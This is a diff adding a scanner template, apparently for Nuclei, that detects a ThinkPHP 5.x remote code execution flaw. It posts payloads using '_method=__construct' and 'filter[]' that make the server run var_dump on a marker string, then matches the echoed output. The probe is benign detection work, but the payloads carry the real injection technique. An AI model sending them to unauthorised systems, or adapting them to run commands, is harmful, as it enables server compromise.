@@ -1,0 +1,25 @@
+id: thinkphp-5x-rce
+info:
+  name: ThinkPHP 5.x Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php?s=captcha"
+      - "{{BaseURL}}/public/index.php?s=captcha"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    payloads:
+      r_datas:
+        - "_method=__construct&method=get&filter[]=var_dump&get[]=this_is_a_testa"
+        - "_method=__construct&method=get&filter[]=var_dump&server[REQUEST_METHOD]=this_is_a_testa"
+    body: "{{r_datas}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "string(15) \"this_is_a_testa\""
+        part: body
